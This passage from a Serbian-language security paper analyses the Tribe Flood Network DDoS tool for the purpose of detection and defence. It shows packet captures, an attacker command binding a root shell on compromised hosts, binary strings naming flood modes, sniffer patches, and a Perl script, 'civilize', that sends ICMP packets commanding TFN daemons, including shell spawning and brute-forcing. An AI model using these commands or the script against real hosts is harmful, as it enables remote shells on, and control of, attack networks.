td 5931 root 3u sock 0,0 92814 can't

identify protocol

&nbsp;

prikaz 2

&nbsp;

&nbsp; Ukoliko je sa TFN serverom pokrenuta komanda da otvori remote-shell odnosno da se omogući daljinsko upravljanje računarom njegov prikaz izgleda ovako:

&nbsp;

&nbsp;

td 5970 root cwd DIR 3,5 1024 240721

/usr/lib/libx/...

td 5970 root rtd DIR 3,1 1024 2 /

td 5970 root txt REG 3,5 297508 240734

/usr/lib/libx/.../td (deleted)

td 5970 root 0u inet 92909 TCP

\*:12345 (LISTEN)

td 5970 root 3u sock 0,0 92814 can't identify protocol

&nbsp;

&nbsp;

prikaz 3

&nbsp;

&nbsp; Ukoliko pratimo mrežni saobraćaj korsteći paket snffit modifikovan sa zakrpom (zakrpa predstavlja izmenu u programu sa kojom se dobijaju neke dodatne opcije koje prvobitno nisu ugrađene) iz priloga A radeći komandu "ping -c 3 10.0.0.1" koja šalje tri ICMP_ECHO paketa, i čeka na ICMP_ECHOREPLY odnosno odgovor izgleda ovako:

&nbsp;

&nbsp;

\# sniffit -d -a -x -b -s @ -Picmp

Supported Network device found. (eth0)

Sniffit.0.3.7 Beta is up and running.... (192.168.0.1)

&nbsp;

ICMP message id: 192.168.0.1 > 10.0.0.1

&nbsp; ICMP type: Echo request

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 08 . 00 . 2B + 51 Q 98 . 04 . 00 . 00 . 37 7 FC . 0D . 38 8

02 . 73 s 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

ICMP message id: 10.0.0.1 > 192.168.0.1

&nbsp; ICMP type: Echo reply

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 00 . 00 . 33 3 51 Q 98 . 04 . 00 . 00 . 37 7 FC . 0D . 38 8

02 . 73 s 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

ICMP message id: 192.168.0.1 > 10.0.0.1

&nbsp; ICMP type: Echo request

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 08 . 00 . 58 X 61 a 98 . 04 . 01 . 00 . 38 8 FC . 0D . 38 8

D3 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

ICMP message id: 10.0.0.1 > 192.168.0.1

&nbsp; ICMP type: Echo reply

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 00 . 00 . 60 \` 61 a 98 . 04 . 01 . 00 . 38 8 FC . 0D . 38 8

D3 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

ICMP message id: 192.168.0.1 > 10.0.0.1

&nbsp; ICMP type: Echo request

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 08 . 00 . 70 p 61 a 98 . 04 . 02 . 00 . 39 9 FC . 0D . 38 8

B9 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

ICMP message id: 10.0.0.1 > 192.168.0.1

&nbsp; ICMP type: Echo reply

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 00 . 00 . 78 x 61 a 98 . 04 . 02 . 00 . 39 9 FC . 0D . 38 8

B9 . 62 b 02 . 00 . 08 . 09 . 0A . 0B . 0C . 0D . 0E . 0F . 10 . 11 . 12 . 13 .

14 . 15 . 16 . 17 . 18 . 19 . 1A . 1B . 1C . 1D . 1E . 1F . 20 21 ! 22 " 23 #

24 \$ 25 % 26 & 27 ' 28 ( 29 ) 2A \* 2B + 2C , 2D - 2E . 2F / 30 0 31 1 32 2 33 3

34 4 35 5 36 6 37 7

&nbsp;

&nbsp;

prikaz 4

&nbsp;

&nbsp; Ovde možemo primetiti da se paketi sa istom vrednošču poslati kao ICMP_ECHO paketi na odredište i sa odredišta se vraćaju na polaznu tačku u obliku ICMP_ECHOREPLY paketa sa takođe istom vrednošću, stim sto se brojevi svake sekvence koje su prikazani kao bajt 7 i 8 povećavaju sa svakim sledećim paketom

&nbsp;

Koristeći istu komandu ping -c ali sada gledajuči protok na mreži sa paketom tcpdump/tcpshow modifikovan sa zakrpom iz priloga B dobijamo ovakav izgled:

&nbsp;

&nbsp;

\# tcpdump -lenx -s 1518 icmp | tcpshow -noip -nolink -cooked

tcpdump: listening on eth0

Packet 1

ICMP Header

&nbsp; Type: echo-request

&nbsp; Checksum: 0x9B2A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0000

ICMP Data

&nbsp; q..8x.

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

Packet 2

ICMP Header

&nbsp; Type: echo-reply

&nbsp; Checksum: 0xA32A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0000

ICMP Data

&nbsp; q..8x.

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

Packet 3

ICMP Header

&nbsp; Type: echo-request

&nbsp; Checksum: 0x623A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0001

ICMP Data

&nbsp; r..8..

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

&nbsp;

Packet 4

ICMP Header

&nbsp; Type: echo-reply

&nbsp; Checksum: 0x6A3A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0001

ICMP Data

&nbsp; r..8..

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

Packet 5

ICMP Header

&nbsp; Type: echo-request

&nbsp; Checksum: 0x5A3A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0002

ICMP Data

&nbsp; s..8..

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

Packet 6

ICMP Header

&nbsp; Type: echo-reply

&nbsp; Checksum: 0x623A

&nbsp; Id: 0x6E03

&nbsp; Sequence: 0x0002

ICMP Data

&nbsp; s..8..

&nbsp; ..

&nbsp; ..................... !"#\$%&'()\*+,-./01234567

&nbsp;

prikaz 5

&nbsp;

&nbsp; Ovde se primećuje da se broj sekvence povećava takođe za jedan počevši od ofseta odnoso inicijalnog paketa čiji je sekvencni broj 0X000.

&nbsp;

&nbsp; Za razliku od standardne ping komande za koju smo rekli da koristi ICMP_ECHO-ICMP_ECHOREPLY pakete ,TFN klijent šalje komade koristeći samo ICMP_ECHOREPLY pakete umesto da koristi ICMP_ECHO pakete . To je urađeno iz razloga da bi se kernel računara na kome se nalazi TFN server srečio da odgovara sa ICMP_ECHOREPLY paketima a ukoliko server treba da šalje odgovore on to radi takođe ICMP_ECHOREPLY paketima.Ovakav vid komunikacije između klijenta i servera se razlikuje od standardnog ICMP_ECHO-ECHOREPLY oblika komunikacije i na taj način se može ući u trag postojećim TFN serverima na mreži.

&nbsp; ICMP_ECHOREPLY identifikaciono polje sadrži komande odnosno 16 bitne vrednosti koje su konvertovane u raspored bajta i teksta u ASCII modu

&nbsp;

&nbsp;

&nbsp; Ovo je primer šta napadač vidi kada izda komandu da se otvori konzola na portu 12345.

&nbsp;

&nbsp;

\# ./tfn iplist 4 12345

&nbsp; \[tribe flood network\] (c) 1999 by Mixter

&nbsp;

\[request: bind shell to port 12345\]

192.168.0.1: shell bound to port 12345

#

&nbsp;

&nbsp; Primer 3

&nbsp;

&nbsp;

&nbsp; Za tu istu komandu koju je napadač izdao ovo je prikaz onoga šta vidimo sa sniffit paketom.

&nbsp;

&nbsp;

ICMP message id: 10.0.0.1 > 192.168.0.1

&nbsp; ICMP type: Echo reply

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 00 . 00 . 64 d D1 . 01 . C8 . 00 . 00 . 31 1 32 2 33 3 34 4

35 5 00 .

&nbsp;

ICMP message id: 192.168.0.1 > 10.0.0.1

&nbsp; ICMP type: Echo reply

.. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. . .. .

.. . .. . .. . .. . 00 . 00 . 6C l AE . 00 . 7B { 00 . 00 . 73 s 68 h 65 e 6C l

6C l 20 62 b 6F o 75 u 6E n 64 d 20 74 t 6F o 20 70 p 6F o 72 r 74 t 20

&nbsp;31 1 32 2 33 3 34 4 35 5 0A . 00 .

&nbsp;

&nbsp;

&nbsp; prikaz 6

&nbsp;

Isti slučaj samo prikaz sa tcpdump alatom

&nbsp;

&nbsp;

\# tcpdump -lnx -s 1518 icmp

tcpdump: listening on eth0

05:51:32.706829 10.0.0.1 > 192.168.0.1: icmp: echo reply

&nbsp; .... .... .... .... .... .... .... ....

&nbsp; .... .... 0000 64d1 01c8 0000 3132 3334

&nbsp; 3500

05:51:32.741556 192.168.0.1 > 10.0.0.1: icmp: echo reply

&nbsp; .... .... .... .... .... .... .... ....

&nbsp; .... .... 0000 6cae 007b 0000 7368 656c

&nbsp; 6c20 626f 756e 6420 746f 2070 6f72 7420

&nbsp; 3132 3334 350a 00

&nbsp;

prikaz 7

&nbsp;

&nbsp;

Isti slučaj ali kombinacijom tcpdump/tcpshow alatom

&nbsp;

&nbsp;

&nbsp;

Packet 1

ICMP Header

&nbsp; Type: echo-reply

&nbsp; Checksum: 0x64D1

&nbsp; Id: 0x01C8

&nbsp; Sequence: 0x0000

ICMP Data

&nbsp; 12345

&nbsp;

Packet 2

ICMP Header

&nbsp; Type: echo-reply

&nbsp; Checksum: 0x6CAE

&nbsp; Id: 0x007B

&nbsp; Sequence: 0x0000

ICMP Data

&nbsp; shell bound to port 12345

&nbsp;

prikaz 8

&nbsp;

&nbsp; Ono što je ovde očigledno jeste da klijent šalje komandu 0x01C8 (decimalno 456) u identifikacijonom polju praćena sa brojem sekvence 0x0000 koje se ovde nemenja terminisana NULL ASCII stringom "12345" (koja određuje port)

&nbsp;

Server odgovara komandom 0x007B (decimalno 123) u identifikacijonom polju,propraćenu brojem sekvence 0x0000,a zatim terminisana NULL ASCII stringom "shell bound to port 12345\\n".U tom trenutku se ovaj string ispisuje na konzoli sa IP adresom servera.

&nbsp;

**6.8 Lokalna Odbrana**

&nbsp;

&nbsp; Iz razloga što programi koriste ICMP_ECHOREPLY pakete za komunikaciju biće veoma teško ako ne čak i nemoguće da se takva vrsta saobraćaja blokira, a da se pri tom neblokiraju većina internet programa koja se oslanjaju na ICMP.

&nbsp; Jedini siguran način da se ugase ovakvi kanali komunikacije jeste da se zabrani sav ICMP_ECHO saobraćaj unutar jedne mreže, inače će se na velikim mrežama strašno teško razlikovati noramlan ICMP_ECHO i ICMP_ECHOREPLY saobraćaj koji se ostvaruje od strane programa poput programa ping od saobraćaja koji se ostvarju koriščenjem ovog i njemu sličnim alatima.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**6.9 Slabosti**

&nbsp;

&nbsp; Ukoliko izvršni kod nije menjan TFN klijenti i serveri se mogu identifikovati posmatrajući stringove uključene u binarnom zapisu programa, koji izgledaju ovako:

&nbsp;

&nbsp;

\# strings - td

. . .

%d.%d.%d.%d

/bin/sh

tfn-daemon

already %s flooding

multiple targets

ICMP flood: %s

tfn-child

SMURF (target@bcast@...): %s

UDP flood: %s

SYN flood: port %d, multiple targets

SYN flood: port %d, %s

ready - size: %d spoof: %d

%s flood terminated

packet size: %d bytes

spoof mask: \*.\*.\*.\* (%s)

spoof mask: 1.\*.\*.\* (%s)

spoof mask: 1.1.\*.\* (%s)

spoof mask: 1.1.1.\* (%s)

spoof test: %s

shell bound to port %s

. . .

\[0;35m\[tribe flood network\]

(c) 1999 by

\[5mMixter

ICMP

SMURF

. . .

&nbsp;

\# strings - tfn

. . .

%d.%d.%d.%d

ERROR reading IP list

\[1;37m

\[request: change packet size\]

\[request: change spoofmask\]

\[request: stop and display status\]

\[request: udp flood %s\]

\[request: syn flood \[port: %s\] %s\]

\[request: icmp flood %s\]

\[request: bind shell to port %s\]

\[request: smurf (target@bcast@...) %s\]

\[0;0m

\[0m%s:

\[0;31m

\[0;34mtimeout

\[1;34m

usage: %s &lt;iplist&gt; &lt;type&gt; \[ip\] \[port\]

&lt;iplist&gt; contains a list of numerical hosts that are ready to flood

&lt;type&gt; -1 for spoofmask type (specify 0-3), -2 for packet size,

&nbsp; is 0 for stop/status, 1 for udp, 2 for syn, 3 for icmp,

&nbsp; 4 to bind a rootshell (specify port)

&nbsp; 5 to smurf, first ip is target, further ips are broadcasts

\[ip\] target ip\[s\], separated by %s if more than one

\[port\] must be given for a syn flood, 0 = RANDOM

skipping

\[0;35m\[tribe flood network\]

(c) 1999 by

\[5mMixter

&nbsp;. . .

&nbsp; prikaz 9

&nbsp;

&nbsp;

&nbsp; Novije verzije TFN klijent/server programa pokazuju postojanje novih kodova za multi-klijent okruženje umesto jedno klijentskog okruženja koje je zasada veoma zastupljeno, Takođe su primećeni i neki novi moduli za enkriptovanje iplista .Nove verzije istog programa pokazuju na postojanje i upotrebu Berkeley "rcp" komande za komunikaciju. Nadgledajući "rcp" konekcije (514/tcp) sa raznih sistema na jednoj mreži može se na nalozima korisnika u direktorijumu ~/.rhosts mogu se videti ostvarene konekcije sa rcp serverima sa naloga koji je posmatran i na taj način zaustavimo mrežu da bude korišćena kao sredstvo nekog napadača.

&nbsp;

&nbsp; Pošto TFN kao što je već napomenuto koristi ICMP pakete, mnogo ih je teško detektovati u akciji i takvi paketi mogu da prođu kroz većinu firewall-ova, a programi poput ngrep-a nisu u stanju da ih detektuju.

&nbsp;

&nbsp; Jedina slabost TFN-a jeste da nepostoji autentikacija izvora ICMP paketa bar ne u analizi postojećih verzije TFN programa .Ukoliko vrednosti komandi nisu menjane samo jedžan paket bi bio dovoljan da ustanovimo postojanje TFN servera na jednoj mreži .

&nbsp; Koristeći Perl skriptu "civilize" datu u prilogu C, a koja koristi Net::RawIP delove TCP protokola, može se ustanoviti postajnje TFN servera. Obelodanjivanjem ovakve vrste servera na jednoj mreži možemo uraditi sledeće: nastojati da TFN program uklonimo sa mreže ili da koristimo TFN za svoje potrebe. Ukoliko su komande menjane može se pokrenuti nad TFN serverom takozvani "brute force attack" koji se sastoji od slanja kombinacije tri broja koji služe za izdavanje komandi i na taj način možemo uspostaviti kontrolu nad njim.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**7.0 Zaključna razmatranja**

&nbsp;

&nbsp;

&nbsp; Primetno je da se u radu govori samo o tome kako sam napad izgleda i kako se može sprečiti da jedna mreža može da bude posrednik u napadu. Jedino što nije rečeno jeste kako sprečiti da budemo žrtve takvog napada, te će se o tome govoriti u ovom zaključku.

&nbsp;

&nbsp; Kao što je već rečeno DDOS napadi koji dolaze u različitim oblicima kao što su smurf, syn-flood, fraggle, itd. predstavljalju u osnovi isporuku ogromne količine paketa ka jednoj odredišnoj adresi odnosno jednoj mreži, tako da se slabost jedne mreže manifestuje u njenom propusnom opsegu odnosno u količini paketa koju ona sama može da procesira .U ovom slučaju će mo govoriti o smurf ili icmp-flood tipu napada. Pošto DDOS koristi ICMP kao osnovni protokol kako za komunikaciju tako i za distribuciju svojih mailicioznih paketa, većina administratora mreža pokušavaju da na ulaznim tačkam ka svojoj mreži kompletno ili delimično zatvore ICMP saobraćaj da bi se zaštitili od ovakve vrste napada , a pri tome nemaju u vidu da bez obzira na to što saboraćaj neće proći unutar njihove mreže on ipak dolazi na ulaznu tačku i tu pravi gužvu, odnosno onemogućuje da se bilo koji drugi saobaraćaj odvija na toj mreži.

&nbsp; Rešenje za ovakvu vrstu DDOS (icmp-flood,smurf) napada jeste ustvari da se takva vrsta saobraćaja pusti kroz ulazne tačke , tačnije da se odvoji deo propusnog opsega na ulaznim tačkama koji će služiti za ICMP saobraćaj .To je najlakše uraditi sa softverom koji se nalazi na novijim verzijama operativnog sistema za rutere pod imenom CAR (confirmed acces rate) koji omogućava da se odvoji određen procenat opsega za ICMP (burst -saobraćaj), tako da nam preostali deo opsega služi za ostali saobraćaj (<http://www.cisco.com/warp/public/784/packet/apr99/1.html>) .

&nbsp; Druga vrsta DDOS napada SYN ili ACK-flood je veoma sličan smurf napadima jer kao i on predstavlja isporučivanje ogromne količine paketa na jednu mrežu, s tim što se paketi u ovom slučaju šalju na oderdišnu adresu ali i na različite portove tog računara ili rutera koji stoji iza te adrese. Još jedna specifičnost za ovu vrstu paketa jeste sama konstrukcija paketa.Kod SYN ili ACK-flooda nešalju se kompletni paketi već samo neki njegovi delovi kao što je syn koji predstavlja samo započinjanje konekcije ili ack deo paketa koji predstavlja samo prvi pristanak na započetu konekciju.Ukoliko se takve vrste paketa šalju ,uređaj koji ih prima nezna šta da radi sa njima, pa se kod tog uređaja manifestuje takozvano "zamrzavanje" odnosno onesposobljavanje samog uređaja za rad usled nepropisno primljenih paketa ili ukoliko je sam uređaj otporan na takve vrste napada dolazi kao i u prvom slučaju do zagušenja na samoj mreži gde se taj uređaj nalazi.

&nbsp; Rešenje za ovakvu vrstu napada je da se na ulazne tačke mreže postave ruteri koji imaju mogućnost prepoznavanja paketa, odnosno da prime samo one pakete koji su kompletni a sve ostale da odbaci odnosno da kaže udaljenoj mašini koja šalje takvu vrstu paketa da prestane. To se radi na taj način što se na ruterima u samo IP-stacku (odvojeno mesto u memoriji računara ili uređaja koji aktivno ušestvuju u mrežnoj komunikaciji za rad sa mrežnim protokolima baziranim na TCP-protokolu) zadaje komanada "ip-revers-unicast" koja omogućuje da se takav vid zaštite sprovede, odnosno ona omogućava da se primaju samo kompletni paketi .

&nbsp;

**Rešenje koje je Yahoo primenio na svojoj mreži**

&nbsp;

&nbsp; Na ulaznim tačkama svoje mreže postavio je 4 rutera sa gigabitnim ulazima na kojima je sproveo ove gore navede mere zaštite i iza njih je stavio nekoliko mašina koji služe kao "amortizeri" odnosno koje će da loguju sve konekcije koje su ostvarene prema Yahoo-voj mreži .Jedini problem koji preostaje Yahoo da reši jesu sami sigurnostni propusti u kros-sajt skriptingu, što ne ulazi u temu ovog rada.

&nbsp;

&nbsp; Da zaključimo, bez obzira na ove date mere zaštite nemoguće je odbraniti se od DDOS napada ukoliko nije zadovoljen osnovni uslov, a to je da se veličina propusnog opsega mora konstantno povećavati do granice finansijske mogućnosti korporacije ukoliko je njoj cilj da se zaštiti od istih.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp; **Prilog A: Zakrpa za sniffit v. 0.3.7.beta za prikaz ne standardnih ICMP podataka**

&nbsp;

&nbsp;

diff -c sniffit.0.3.7.beta.orig/sn_defines.h sniffit.0.3.7.beta/sn_defines.h

\*\*\* sniffit.0.3.7.beta.orig/sn_defines.h Wed Aug 26 12:21:23 1998

\--- sniffit.0.3.7.beta/sn_defines.h Wed Oct 20 10:15:41 1999

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 126,132 \*\*\*\*

&nbsp; #define ICMP_TYPE_3 "Destination unreachable"

&nbsp; #define ICMP_TYPE_4 "Source quench"

&nbsp; #define ICMP_TYPE_5 "Redirect"

! #define ICMP_TYPE_8 "Echo"

&nbsp; #define ICMP_TYPE_11 "Time exceeded"

&nbsp; #define ICMP_TYPE_12 "Parameter problem"

&nbsp; #define ICMP_TYPE_13 "Timestamp"

\--- 126,132 ----

&nbsp; #define ICMP_TYPE_3 "Destination unreachable"

&nbsp; #define ICMP_TYPE_4 "Source quench"

&nbsp; #define ICMP_TYPE_5 "Redirect"

! #define ICMP_TYPE_8 "Echo request"

&nbsp; #define ICMP_TYPE_11 "Time exceeded"

&nbsp; #define ICMP_TYPE_12 "Parameter problem"

&nbsp; #define ICMP_TYPE_13 "Timestamp"

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 134,140 \*\*\*\*

&nbsp; #define ICMP_TYPE_15 "Information request"

&nbsp; #define ICMP_TYPE_16 "Information reply"

&nbsp; #define ICMP_TYPE_17 "Address mask request"

! #define ICMP_TYPE_18 "Adress mask reply"

&nbsp;

&nbsp; /\*\*\* Services (standardised) \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/

&nbsp; #define FTP_DATA_1 20

\--- 134,140 ----

&nbsp; #define ICMP_TYPE_15 "Information request"

&nbsp; #define ICMP_TYPE_16 "Information reply"

&nbsp; #define ICMP_TYPE_17 "Address mask request"

! #define ICMP_TYPE_18 "Address mask reply"

&nbsp;

&nbsp; /\*\*\* Services (standardised) \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/

&nbsp; #define FTP_DATA_1 20

diff -c sniffit.0.3.7.beta.orig/sniffit.0.3.7.c sniffit.0.3.7.beta/sniffit.0.3.7.c

\*\*\* sniffit.0.3.7.beta.orig/sniffit.0.3.7.c Wed Aug 26 12:21:25 1998

\--- sniffit.0.3.7.beta/sniffit.0.3.7.c Wed Oct 20 10:15:49 1999

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 1333,1339 \*\*\*\*

&nbsp; printf ("Unknown ICMP type!\\n");

&nbsp; break;

&nbsp; }

! printf ("\\n");

&nbsp; return;

&nbsp; }

&nbsp; if (finish < 30) /\* nothing yet \*/

\--- 1333,1351 ----

&nbsp; printf ("Unknown ICMP type!\\n");

&nbsp; break;

&nbsp; }

! total_length = info.IP_len + info.ICMP_len + info.DATA_len;

! n = 0;

! for (i = 0; i < total_length; i++)

! {

! unsigned char c = sp\[PROTO_HEAD + i\];

! if (n > 75)

! n = 0, printf ("\\n");

! if (DUMPMODE & 1)

! n += printf (" %02X", c);

! if (DUMPMODE & 2)

! n += printf (" %c", isprint (c) ? c : '.');

! }

! printf ("\\n\\n");

&nbsp; return;

&nbsp; }

&nbsp; if (finish < 30) /\* nothing yet \*/

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp; **Prilog B: Zakrpa za tcpshow 1.0 za prikaz ICMP ECHO identifikacije /sekvence**

&nbsp;

&nbsp;

diff -c tcpshow.c.orig tcpshow.c

\*\*\* tcpshow.c.orig Thu Oct 21 14:12:19 1999

\--- tcpshow.c Thu Oct 21 14:22:34 1999

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 1081,1086 \*\*\*\*

\--- 1081,1088 ----

&nbsp; uint2 nskipped;

&nbsp; uint1 type;

&nbsp; char \*why;

- uint2 echo_id;

- uint2 echo_seq;

&nbsp; type = getbyte(&pkt); nskipped = sizeof(type);

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 1091,1096 \*\*\*\*

\--- 1093,1103 ----

&nbsp; /\* Must calculate it from the size of the IP datagram - the IP header. \*/

&nbsp; datalen -= ICMPHDRLEN;

&nbsp;

- if (type == ECHO_REQ || type == ECHO_REPLY) {

-       echo_id = getword(&pkt); nskipped += sizeof(cksum);

-       echo_seq = getword(&pkt); nskipped += sizeof(cksum);

- }

-

&nbsp; why = icmpcode(type, code);

&nbsp; if (dataflag) {

&nbsp; printf(

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* 1113,1118 \*\*\*\*

\--- 1120,1129 ----

&nbsp; icmptype(type), why? "\\n\\tBecause:\\t\\t\\t": "", why? why: ""

&nbsp; );

&nbsp; printf("\\tChecksum:\\t\\t\\t0x%04X\\n", cksum);

-       if (type == ECHO_REQ || type == ECHO_REPLY) {

-          printf("\\tId:\\t\\t\\t\\t0x%04X\\n", echo_id);

-          printf("\\tSequence:\\t\\t\\t0x%04X\\n", ntohs(echo_seq));

-       }

&nbsp; }

&nbsp;

&nbsp; return pkt;

&nbsp;

&nbsp;

**Prilog C Perl skripta "civilize" za kontrolu TFN servera**

&nbsp;

# !/usr/bin/perl

#

\# civilize v. 1.0

\# By Dave Dittrich &lt;<dittrich@cac.washington.edu>&gt;

#

\# Send commands to TFN daemon(s), causing them to do things like

\# spawn shells, stop floods and report status, etc. Using this program

\# (and knowledge of the proper daemon "passwords"), you can affect TFN

\# daemons externally and monitor packets to verify if a daemon is

\# running, etc. You can also brute force attack the "passwords" by

\# sending packets until you get the desired reply (or give up.)

#

\# Needs Net::RawIP (<http://quake.skif.net/RawIP>)

\# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)

#

\# Example: ./civilize \[options\] host1 \[host2 \[...\]\]

#

\# (This code was hacked from the "macof" program, written by

\# Ian Vitek &lt;<ian.vitek@infosec.se>&gt;)

&nbsp;

require 'getopts.pl';

use Net::RawIP;

require 'netinet/in.ph';

&nbsp;

\$a = new Net::RawIP({icmp => {}});

chop(\$hostname = \`hostname\`);

&nbsp;

Getopts('a:c:f:i:vh');

die "usage: \$0 \[options\] iplist\\

\\t-a arg\\t\\tSend command argument 'arg' (default \\"12345\\")\\

\\t-c val\\t\\tSend command value 'val' (default 456 - spawn a shell)\\

\\t-f from_host\\t\\t(default:\$hostname)\\

\\t-i interface \\t\\tSet sending interface (default:eth0)\\

\\t-v\\t\\t\\tVerbose\\

\\t-h This help\\n" unless ( !\$opt_h );

&nbsp;

\# set default values

\$opt_i = (\$opt_i) ? \$opt_i : "eth0";

\$opt_a = (\$opt_a) ? \$opt_a : "12345";

\$opt_c = (\$opt_c) ? \$opt_c : "456";

&nbsp;

\# choose network card

if(\$opt_e) {

&nbsp; \$a->ethnew(\$opt_i, dest => \$opt_e);

} else {

&nbsp; \$a->ethnew(\$opt_i);

}

&nbsp;

\$s_host = (\$opt_h) ? \$opt_h : \$hostname;

&nbsp;

if (\$ARGV\[0\]) {

&nbsp; open(I,"<\$ARGV\[0\]") || die "could not open file: '\$ARGV\[0\]'";

&nbsp; while (&lt;I&gt;) {

&nbsp; chop;

&nbsp; push(@list,\$\_);

&nbsp; }

&nbsp; close(I);

}

&nbsp;

\# Put value in network byte order (couldn't get htons() in

\# "netinet/in.ph" to work. Go figure.)

\$id = unpack("S", pack("n", \$opt_c));

&nbsp;

foreach \$d_host (@list) {

&nbsp; \$a->set({ip => {saddr => \$s_host, daddr => \$d_host},

&nbsp; icmp => {type => 0, id => \$id, data => "\$opt_a\\0"}

&nbsp; });

&nbsp; print "sending packet \[\$opt_c/\$opt_a\] to \$d_host\\n" if \$opt_v;

&nbsp; \$a->send;

}

&nbsp;

exit(0);

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

**Literatura:**

&nbsp;

&nbsp;

| Brian Komar "TCP/IP"                                                 | Kompijuter biblioteka 1999              |
| -------------------------------------------------------------------- | --------------------------------------- |
| David Dittrich "TFN analiza"                                         | <http://staff.washington.edu/dittrich/> |
| Centar za internet sigurnost i expertizu                             | <http://www.cert.org/>                  |
| Aleksandar Bijelić                                                   | Konsultant za sigurnost mreže           |
| Informativni centar za sigurnost operativnih sistema                 | <http://www.security-focus.com>         |
